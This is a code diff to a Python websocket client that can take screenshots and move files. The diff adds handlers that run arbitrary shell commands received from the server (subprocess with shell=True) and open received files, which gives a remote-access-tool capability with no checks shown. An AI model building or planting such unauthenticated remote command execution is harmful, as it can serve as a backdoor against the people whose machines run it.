@@ -1,8 +1,9 @@
 import asyncio
 import base64
-import datetime
 import json
 import os
+import subprocess
+
 import pyautogui
 
 import websockets
@@ -87,10 +88,23 @@ async def listen(websocket: websockets.ClientConnection):
         await websocket.send(json.dumps(packet))
         print(f"Uploaded {data["filename"]}")
 
+    async def command():
+        packet = dict(data)
+        result = subprocess.run(data["command"], shell=True, text=True, capture_output=True)
+        packet["out"], packet["err"] = result.stdout, result.stderr
+        await websocket.send(json.dumps(packet))
+
+    async def run():
+        packet = dict(data)
+        os.startfile(data["filename"])
+        await websocket.send(json.dumps(packet))
+
     func_map = {
         "snip": snip,
         "upload": upload,
         "download": download,
+        'command': command,
+        'run': run,
     }
 
     async for message in websocket:
